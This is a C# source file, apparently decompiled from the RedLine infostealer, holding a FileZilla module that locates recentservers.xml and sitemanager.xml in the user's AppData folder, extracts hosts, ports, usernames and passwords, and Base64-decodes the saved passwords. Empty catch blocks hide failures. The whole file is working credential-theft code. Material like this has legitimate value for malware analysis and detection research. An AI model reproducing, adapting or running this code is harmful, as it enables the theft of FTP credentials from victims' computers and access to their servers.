using RedLine.Logic.Helpers;
using RedLine.Models;
using System;
using System.Collections.Generic;
using System.IO;
using System.Xml;

namespace RedLine.Logic.FtpClients
{
  public static class FileZilla
  {
    public static List<LoginPair> ParseConnections()
    {
      List<LoginPair> loginPairList = new List<LoginPair>();
      try
      {
        string str1 = string.Format("{0}\\FileZilla\\recentservers.xml", (object) Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData));
        string str2 = string.Format("{0}\\FileZilla\\sitemanager.xml", (object) Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData));
        if (File.Exists(str1))
          loginPairList.AddRange((IEnumerable<LoginPair>) FileZilla.ParseCredentials(str1));
        if (File.Exists(str2))
          loginPairList.AddRange((IEnumerable<LoginPair>) FileZilla.ParseCredentials(str2));
      }
      catch
      {
      }
      return loginPairList;
    }

    private static List<LoginPair> ParseCredentials(string Path)
    {
      List<LoginPair> loginPairList = new List<LoginPair>();
      try
      {
        XmlTextReader xmlTextReader = new XmlTextReader(Path);
        XmlDocument xmlDocument = new XmlDocument();
        xmlDocument.Load((XmlReader) xmlTextReader);
        foreach (XmlNode childNode in xmlDocument.DocumentElement.ChildNodes[0].ChildNodes)
        {
          LoginPair recent = FileZilla.ParseRecent(childNode);
          if (recent.Login != "UNKNOWN" && recent.Host != "UNKNOWN")
            loginPairList.Add(recent);
        }
      }
      catch
      {
      }
      return loginPairList;
    }

    private static LoginPair ParseRecent(XmlNode xmlNode)
    {
      LoginPair loginPair = new LoginPair();
      try
      {
        foreach (XmlNode childNode in xmlNode.ChildNodes)
        {
          if (childNode.Name == "Host")
            loginPair.Host = childNode.InnerText;
          if (childNode.Name == "Port")
            loginPair.Host = loginPair.Host + ":" + childNode.InnerText;
          if (childNode.Name == "User")
            loginPair.Login = childNode.InnerText;
          if (childNode.Name == "Pass")
            loginPair.Password = DecryptHelper.Base64Decode(childNode.InnerText);
        }
      }
      catch
      {
      }
      finally
      {
        loginPair.Login = string.IsNullOrEmpty(loginPair.Login) ? "UNKNOWN" : loginPair.Login;
        loginPair.Host = string.IsNullOrEmpty(loginPair.Host) ? "UNKNOWN" : loginPair.Host;
        loginPair.Password = string.IsNullOrEmpty(loginPair.Password) ? "UNKNOWN" : loginPair.Password;
      }
      return loginPair;
    }
  }
}
